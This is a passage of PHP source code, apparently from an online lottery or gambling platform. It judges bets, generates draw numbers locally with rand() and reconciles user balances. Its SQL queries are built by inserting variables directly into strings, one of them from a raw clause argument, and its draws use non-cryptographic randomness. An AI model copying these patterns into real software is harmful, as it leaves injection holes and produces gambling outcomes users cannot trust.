                    $tmp == '和' && $p['name'] != '和' && ($v = 2);
                    break;
                case "极大":
                    $ma >= 22 && ($v = 1);
                    break;
                case "极小":
                    $ma <= 5 && ($v = 1);
                    break;
                case '总大单':
                    $tmp = danshuang($ma);
                    ($tmp == "单" && $ma > 14) && ($v = 1);
                    break;
                case '总大双':
                    $tmp = danshuang($ma);
                    ($tmp == "双" && $ma > 14) && ($v = 1);
                    ($tmp == "双" && $ma == 14) && ($v = 2);
                    break;
                case '总小单':
                    $tmp = danshuang($ma);
                    ($tmp == "单" && $ma < 13) && ($v = 1);
                    ($tmp == "单" && $ma == 13) && ($v = 2);
                    break;
                case '总小双':
                    $tmp = danshuang($ma);
                    ($tmp == "双" && $ma < 13) && ($v = 1);
                    break;
                default:
                    $ma == $p['name'] && ($v = 1);
                    break;
            }
            break;
        case '组选3':
            $arr = $kj;
            if (duizhi($arr[0], $arr[1], $arr[2]) != 1) {
                $v = 0;
                break;
            }
            $cons = explode('-', $con);
            $cons = array_unique($cons);
            $cc = count($cons);
            if (in_array($arr[0], $cons) && in_array($arr[1], $cons) && in_array($arr[2], $cons)) {
                $v = 1;
            } else {
                $v = 0;
            }
            break;
        case '组选6':
            $arr = $kj;
            if (duizhi($arr[0], $arr[1], $arr[2]) == 1 | baozhi($arr[0], $arr[1], $arr[2]) == 1) {
                $v = 0;
                break;
            }
            $cons = explode('-', $con);
            $cons = array_unique($cons);
            $cc = count($cons);
            if (in_array($arr[0], $cons) && in_array($arr[1], $cons) && in_array($arr[2], $cons)) {
                $v = 1;
            } else {
                $v = 0;
            }
            break;
        case '跨度':
            $k1 = abs($kj[0] - $kj[1]);
            $k2 = abs($kj[0] - $kj[2]);
            $k3 = abs($kj[1] - $kj[2]);
            $k = max($k1, $k2, $k3);
            $k == $p['name'] ? $v = 1 : ($v = 0);
            break;
        case '前三':
            $k1 = $kj[0];
            $k2 = $kj[1];
            $k3 = $kj[2];
            switch ($p['name']) {
                case '豹子':
                    $vv = baozhi($k1, $k2, $k3);
                    $vv == 1 ? $v = 1 : ($v = 0);
                    break;
                case '顺子':
                    $vv = shunzhi($k1, $k2, $k3);
                    $vv == 1 ? $v = 1 : ($v = 0);
                    break;
                case '对子':
                    $vv = duizhi($k1, $k2, $k3);
                    $vv == 1 ? $v = 1 : ($v = 0);
                    break;
                case '半顺':
                    $vv = banshun($k1, $k2, $k3);
                    $vv == 1 ? $v = 1 : ($v = 0);
                    break;
                case '杂六':
                    $vv = zaliu($k1, $k2, $k3);
                    $vv == 1 ? $v = 1 : ($v = 0);
                    break;
            }
            break;
    }
    return [$v];
}
function suiji($fenlei, $gid, $qishu)
{
    switch ($fenlei) {
        case '101':
            return suijikj($gid, $qishu, 5);
            break;
        case '107':
            return suijikj($gid, $qishu, 10);
            break;
        case '151':
            return suijikj($gid, $qishu, 3);
            break;
        case '161':
            return suijikj($gid, $qishu, 20);
            break;
        case '163':
            return suijikj($gid, $qishu, 4);
            break;
        case '121':
            return suijikj($gid, $qishu, 6);
            break;
        case '103':
            return suijikj($gid, $qishu, 8);
            break;
        case '100':
            return suijikj($gid, $qishu, 7);
            break;
    }
}
function suijikj($gid, $qishu, $mnum)
{
    $m = array();
    switch ($mnum) {
        case 4:
            $arr = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9];
            $m[0] = $arr[rand(0, 9)];
            $m[1] = $arr[rand(0, 9)];
            $m[2] = $arr[rand(0, 9)];
            break;
        case 3:
            $arr = [1, 2, 3, 4, 5, 6];
            $m[0] = $arr[rand(0, 5)];
            $m[1] = $arr[rand(0, 5)];
            $m[2] = $arr[rand(0, 5)];
            break;
        case 5:
            $arr = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9];
            $m[0] = $arr[rand(0, 9)];
            $m[1] = $arr[rand(0, 9)];
            $m[2] = $arr[rand(0, 9)];
            $m[3] = $arr[rand(0, 9)];
            $m[4] = $arr[rand(0, 9)];
            break;
        case 8:
            $arr = ["01", "02", "03", "04", "05", "06", "07", "08", "09", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19", "20"];
            $m[0] = $arr[rand(0, 19)];
            for ($i = 1; $i < 8; $i++) {
                $m[$i] = randm($m, $arr, $mnum, 20);
            }
            break;
        case 6:
            $arr = ["01", "02", "03", "04", "05", "06", "07", "08", "09", "10", "11"];
            $m[0] = $arr[rand(0, 10)];
            for ($i = 1; $i < 5; $i++) {
                $m[$i] = randm($m, $arr, $mnum, 11);
            }
            break;
        case 20:
            for ($i = 1; $i <= 80; $i++) {
                if ($i < 10) {
                    $arr[$i - 1] = '0' . $i;
                } else {
                    $arr[$i - 1] = $i;
                }
            }
            $m[0] = $arr[rand(0, 79)];
            for ($i = 1; $i < 20; $i++) {
                $m[$i] = randm($m, $arr, $mnum, 80);
            }
            break;
        case 7:
            for ($i = 1; $i <= 49; $i++) {
                if ($i < 10) {
                    $arr[$i - 1] = '0' . $i;
                } else {
                    $arr[$i - 1] = $i;
                }
            }
            $m[0] = $arr[rand(0, 48)];
            for ($i = 1; $i < 7; $i++) {
                $m[$i] = randm($m, $arr, $mnum, 49);
            }
            break;
        case 10:
            $arr = ["01", "02", "03", "04", "05", "06", "07", "08", "09", "10"];
            $m[0] = $arr[rand(0, 9)];
            for ($i = 1; $i < 10; $i++) {
                $m[$i] = randm($m, $arr, $mnum, 10);
            }
            break;
    }
    return $m;
}
function jiaozhengedu($qz = false)
{
    include(APP_PATH . '/hide/controller/db2.php');
    // global $tsql, $psql, $tb_user, $tb_lib, $tb_config, $tb_game;
    $rs = Db::query("select editstart,reseted,editend from `$tb_config`");
    $sdate = week();
    if ($rs[0]['reseted'] == 'week') {
        $start = $sdate[5] . ' ' . $rs[0]['editend'];
    } else {
        $his = date("His");
        if ($his <= 60030) {
            $start = date("Y-m-d", time() - 86400) . ' ' . $rs[0]['editend'];
        } else {
            $start = $sdate[10] . ' ' . $rs[0]['editend'];
        }
    }
    $fstart = $sdate[10] . ' ' . $rs[0]['editend'];
    $end = sqltime(time());
    $us = Db::query("select userid,maxmoney,kmaxmoney,money,kmoney,sy,jetotal,jzkmoney from `$tb_user` where ifagent=0 and ifson=0 and fudong=0");
    $cu = count($us);
    //$g0 = " gid in(select gid from `$tb_game` where ifopen=1 and fast=0) ";
    //$g1 = " gid in(select gid from `$tb_game` where ifopen=1 and fast=1) ";
    for ($i = 0; $i < $cu; $i++) {
        $uid = $us[$i]['userid'];
        $wh = " userid='$uid' and time>='$start' and time<='$end' ";
        $rs = Db::query("select sum(je) from `$tb_lib` where $wh and z!=9");
        $jetotals = pr4($rs[0]['sum(je)']);
        $rs = Db::query("select sum(je),sum(je*points/100) from `$tb_lib` where $wh and z!=9 and z!=2 and z!=7");
        $yjs = pr4($rs[0]['sum(je)']);
        $points = pr4($rs[0]['sum(je*points/100)']);
        $rs = Db::query("select sum(je*peilv1),sum(prize) from `$tb_lib` where $wh and z=1 ");
        $yizhong = pr4($rs[0]['sum(je*peilv1)'] - $rs[0]['sum(prize)']);
        $rs = Db::query("select sum(je*peilv2) from `$tb_lib` where $wh and z=3 ");
        $yizhong += pr4($rs[0]['sum(je*peilv2)']);
        $rs = Db::query("select sum(je) from `$tb_lib` where $wh and z=9 ");
        $wjs = pr4($rs[0]['sum(je)']);
        $mon = $us[$i]['kmaxmoney'] - $yjs - $wjs + $yizhong + $points - $us[$i]['jzkmoney'];
        $sy = $yizhong + $points - $yjs;
        if ($jetotals != $us[$i]['jetotal'] || $qz) {
            Db::query("update `$tb_user` set kmoney='$mon',sy='$sy',jetotal='$jetotals' where userid='$uid' and kmoney=" . $us[$i]['kmoney'] . "");
            usermoneylog($uid, pr4($mon - $us[$i]['kmoney']), $mon, '结算后较正', 1, '127.0.0.1');
        }
    }
    $us = Db::query("select userid,kmaxmoney,kmoney,ftime,wid,jetotal,jzkmoney from `$tb_user` where fudong=1");
    $cu = count($us);
    for ($i = 0; $i < $cu; $i++) {
        $uid = $us[$i]['userid'];
        $ftime = $us[$i]['ftime'];
        $wh = "  userid='$uid' and time>'$ftime' ";
        $rs = Db::query("select sum(je) from `$tb_lib` where $wh and z!=9");
        $jetotals = pr4($rs[0]['sum(je)']);
        $rs = Db::query("select sum(je),sum(je*points/100) from `$tb_lib` where $wh and z!=9 and z!=2 and z!=7");
        $yjs = pr4($rs[0]['sum(je)']);
        $points = pr4($rs[0]['sum(je*points/100)']);
        $rs = Db::query("select sum(je*peilv1),sum(prize) from `$tb_lib` where $wh and z=1 ");
        $yizhong = pr4($rs[0]['sum(je*peilv1)'] - $rs[0]['sum(prize)']);
        $rs = Db::query("select sum(je*peilv2) from `$tb_lib` where $wh and z=3 ");
        $yizhong += pr4($rs[0]['sum(je*peilv2)']);
        $rs = Db::query("select sum(je) from `$tb_lib` where $wh and z=9 ");
        $wjs = pr4($rs[0]['sum(je)']);
        $mon = $us[$i]['kmaxmoney'] - $yjs - $wjs + $yizhong + $points - $us[$i]['jzkmoney'];
        $sy = $yizhong + $points - $yjs;
        if ($jetotals != $us[$i]['jetotal'] || $qz) {
            Db::query("update `$tb_user` set kmoney='$mon',sy='$sy',jetotal='$jetotals' where userid='$uid' and kmoney=" . $us[$i]['kmoney']);
            usermoneylog($uid, pr4($mon - $us[$i]['kmoney']), $mon, '结算后较正', 1, '127.0.0.1');
        }
    }
    return 1;
}
function nndaxiao($v)
{
    if ($v >= 1 & $v <= 5) {
        return '小';
    } else {
        return '大';
    }
}
function niuniu($arr)
{
    $t1 = 0;
    $t2 = 0;
    $t3 = 0;
    for ($a = 0; $a <= 2; $a++) {
        for ($b = $a + 1; $b <= 3; $b++) {
            for ($c = $b + 1; $c <= 4; $c++) {
                if (($arr[$a] + $arr[$b] + $arr[$c]) % 10 == 0) {
                    $t1 = 1;
                    for ($j = 0; $j <= 4; $j++) {
                        if ($j != $a && $j != $b && $j != $c) {
                            $t3 += $arr[$j];
                        }
                    }
                    if ($t3 % 10 == 0) {
                        $t2 = 1;
                    }
                }
            }
        }
    }
    $arr = [$t1, $t2, $t3 % 10, max($arr[0], $arr[1], $arr[2], $arr[3], $arr[4])];
    return $arr;
}
function suoha($arr)
{
    $r = 0; //散号
    $a = array();
    foreach ($arr as $v) {
        $a[$v] += 1;
    }
    array_merge($a);
    $ca = count($a);
    switch ($ca) {
        case 1:
            $r = 1; //五梅
            break;
        case 2:
            sort($a);
            if ($a[0] == 1 | $a[1] == 1) {
                $r = 2; //炸弹
            } else {
                $r = 3; //葫芦
            }
            break;
        case 3:
            if ($a[0] == 3 | $a[1] == 3 | $a[2] == 3) {
                $r = 4; //三条
            } else {
                $r = 5; //两对
            }
            break;
        case 4:
            $r = 6; //单对
            break;
        case 5:
            sort($arr);
            if ($arr[4] - $arr[0] == 4) {
                $r = 7; //顺子
            } else {
                $kao1 = array(1, 3, 5, 7, 9);
                $kao2 = array(0, 2, 4, 6, 8);
                if ($arr == $kao1 | $arr == $kao2) {
                    $r = 8; //五不靠
                }
            }
            break;
    }
    $arr = array("散号", "五梅", "炸弹", "葫芦", "三条", "两对", "单对", "顺子", "五不靠");
    return $arr[$r];
}
function danshuang($v)
{
    if ($v % 2 == 1) {
        $v = '单';
    } else {
        $v = '双';
    }
    return $v;
}
function danshuang_100($v)
{
    if ($v % 2 == 1) {
        $v = '單';
    } else {
        $v = '雙';
    }
    return $v;
}
function daxiao($v)
{
    $dashu   = array(
        5,
        6,
        7,
        8,
        9
    );
    if (in_array($v, $dashu)) {
        $v = '大';
    } else {
        $v = '小';
    }
    return $v;
}
function daxiao107($v)
{
    if ($v > 5) {
        $v = '大';
    } else {
        $v = '小';
    }
    return $v;
}
function daxiao121($v)
{
    if ($v == 11) {
        $v = '和';
    } else if ($v > 5) {
        $v = '大';
    } else {
        $v = '小';
    }
    return $v;
}
function daxiao103($v)
{
    if ($v > 10) {
        $v = '大';
    } else {
        $v = '小';
    }
    return $v;
}
function daxiaow($v)
{
    if ($v <= 4) {
        return '小';
    } else {
        return '大';
    }
}
function zhihe($v)
{
    $zhishu  = array(
        1,
        2,
        3,
        5,
        7
    );
    if (in_array($v, $zhishu)) {
        $v = '质';
    } else {
        $v = '合';
    }
    return $v;
}
function heshu($tm)
{
    if ($tm == '') {
        return '';
    }
    $heshu = $tm % 10 + ($tm - $tm % 10) / 10;
    return $heshu;
}
function heshudaxiao_100($v)
{
    if ($v == 13) {
        return "和";
    } else if ($v <= 6) {
        return "合小";
    } else {
        return "合大";
    }
}
function longhuhe($v0, $v4)
{
    $v0 = $v0 + 0;
    $v4 = $v4 + 0;
    if ($v0 > $v4) {
        $v = '龙';
    } else {
        if ($v0 < $v4) {
            $v = '虎';
        } else {
            $v = '和';
        }
    }
    return $v;
}
function siji($v)
{
    //if(strpos('anull',$v)) return '';
    if (in_array($v, array(
        1,
        2,
        3,
        4,
        5
    ))) {
        $v = '春';
    } else {
        if (in_array($v, array(
            6,
            7,
            8,
            9,
            10
        ))) {
            $v = '夏';
        } else {
            if (in_array($v, array(
                11,
                12,
                13,
                14,
                15
            ))) {
                $v = '秋';
            } else {
                if (in_array($v, array(
                    16,
                    17,
                    18,
                    19,
                    20
                ))) {
                    $v = '冬';
                }
            }
        }
    }
    return $v;
}
function wuhang($v)
{
    //if(strpos('anull',$v)) return '';
    if (in_array($v, array(
        5,
        10,
        15,
        20
    ))) {
        $v = '金';
    } else {
        if (in_array($v, array(
            1,
            6,
            11,
            16
        ))) {
            $v = '木';
        } else {
            if (in_array($v, array(
                2,
                7,
                12,
                17
            ))) {
                $v = '水';
            } else {
                if (in_array($v, array(
                    3,
                    8,
                    13,
                    18
                ))) {
                    $v = '火';
                } else {
                    if (in_array($v, array(
                        4,
                        9,
                        14,
                        19
                    ))) {
                        $v = '土';
                    }
                }
            }
        }
    }
    return $v;
}
function wuhang_161($v)
{
    if ($v <= 695) {
        $v = '金';
    } else if ($v <= 763) {
        $v = '木';
    } else if ($v <= 855) {
        $v = '水';
    } else if ($v <= 923) {
        $v = '火';
    } else {
        $v = '土';
    }
    return $v;
}
function fangwei($v)
{
    //if(strpos('anull',$v)) return '';
    if (in_array($v, array(
        1,
        5,
        9,
        13,
        17
    ))) {
        $v = '东';
    } else {
        if (in_array($v, array(
            2,
            6,
            10,
            14,
            18
        ))) {
            $v = '南';
        } else {
            if (in_array($v, array(
                3,
                7,
                11,
                15,
                19
            ))) {
                $v = '西';
            } else {
                if (in_array($v, array(
                    4,
                    8,
                    12,
                    16,
                    20
                ))) {
                    $v = '北';
                }
            }
        }
    }
    return $v;
}
function zhongfabai($v)
{
    //if(strpos('anull',$v)) return '';
    if (in_array($v, array(
        1,
        2,
        3,
        4,
        5,
        6,
        7
    ))) {
        $v = '中';
    } else {
        if (in_array($v, array(
            8,
            9,
            10,
            11,
            12,
            13,
            14
        ))) {
            $v = '发';
        } else {
            if (in_array($v, array(
                15,
                16,
                17,
                18,
                19,
                20
            ))) {
                $v = '白';
            }
        }
    }
    return $v;
}
function sx_100($m, $arr)
{
    $sx = array(
        "鼠",
        "牛",
        "虎",
        "兔",
        "龍",
        "蛇",
        "馬",
        "羊",
        "猴",
        "雞",
        "狗",
        "豬"
    );
    foreach ($sx as $v) {
        if (in_array($m, $arr[$v])) {
            return $v;
        }
    }
    return false;
}
function phpC($a, $m)
{
    $r = array();

    $n = count($a);
    if ($m <= 0 || $m > $n) {
        return $r;
    }

    for ($i = 0; $i < $n; $i++) {
        $t = array($a[$i]);
        if ($m == 1) {
            $r[] = $t;
        } else {
            $b = array_slice($a, $i + 1);
            $c = phpC($b, $m - 1);
            foreach ($c as $v) {
                $r[] = array_merge($t, $v);
            }
        }
    }

    return $r;
}
function phpC2(array $elements, $chosen)
{
    $result = array();
    for ($i = 0; $i < $chosen; $i++) {
        $vecm[$i] = $i;
    }
    for ($i = 0; $i < $chosen - 1; $i++) {
        $vecb[$i] = $i;
    }
    $vecb[$chosen - 1] = count($elements) - 1;
    $result[]          = $vecm;
    $mark              = $chosen - 1;
    while (true) {
        if ($mark == 0) {
            $vecm[0]++;
            $result[] = $vecm;
            if ($vecm[0] == $vecb[0]) {
                for ($i = 1; $i < $chosen; $i++) {
                    if ($vecm[$i] < $vecb[$i]) {
                        $mark = $i;
                        break;
                    }
                }
                if ($i == $chosen && $vecm[$chosen - 1] == $vecb[$chosen - 1]) {
                    break;
                }
            }
        } else {
            $vecm[$mark]++;
            $mark--;
            for ($i = 0; $i <= $mark; $i++) {
                $vecb[$i] = $vecm[$i] = $i;
            }
            $vecb[$mark] = $vecm[$mark + 1] - 1;
            $result[]    = $vecm;
        }
    }
    return $result;
}
function getbuz($gid, $whi)
{
    include(APP_PATH . '/hide/controller/db2.php');
    $carr = implode($carr);
    $sql = "select buzqishu,name from `$tb_play` where gid='$gid' $whi order by xsort";
    $arr = Db::query($sql);
    return $arr;
}

function getpk10nium($kj, $arr)
{
    $a = [];
    $arr = explode('-', $arr);
    foreach ($arr as $v) {
        $a[] = $kj[$v - 1];
    }
    return $a;
}

function bjniuniu($a1, $a2, $pk10ts)
{
    if (!$a1[0] & $a2[0]) {
        return 1;
    }
    if ($a1[0] & !$a2[0]) {
        return 0;
    }
    if ($a1[0] & $a2[0]) {
        if ($a1[2] == 0) $a1[2] = 10;
        if ($a2[2] == 0) $a2[2] = 10;
        if ($a1[2] > $a2[2]) {
            return 0;
        } else if ($a1[2] == $a2[2]) {
            return 2;
        } else if ($a1[2] < $a2[2]) {
            return 1;
        }
    }

    if (!$a1[0] & !$a2[0]) {
        if ($a2[3] < $pk10ts) {
            return 0;
        }
        if ($a1[3] > $a2[3]) {
            return 0;
        } else if ($a1[3] == $a2[3]) {
            return 2;
        } else if ($a1[3] < $a2[3]) {
            return 1;
        }
    }
    return 0;
}

/**
 * 向指定 UID 的用户推送 WebSocket 消息
 *
 * @param int $uid 用户 ID
 * @param array|string $data 要推送的数据（数组将自动转为 JSON）
 * @return bool
 */
function ws_push_to_uid($uid, $data)
{
    $redis = Cache::store('redis')->handler();
    $fd = $redis->get("ws:uid:{$uid}");
    if (!$fd) return false;

    global $ws_server;
    if (!isset($ws_server) || !$ws_server instanceof \Swoole\WebSocket\Server) {
        return false;
    }

    if ($ws_server->isEstablished($fd)) {
        $payload = is_array($data) ? json_encode($data, JSON_UNESCAPED_UNICODE) : $data;
        $ws_server->push($fd, $payload);
        return true;
    }

    return false;
}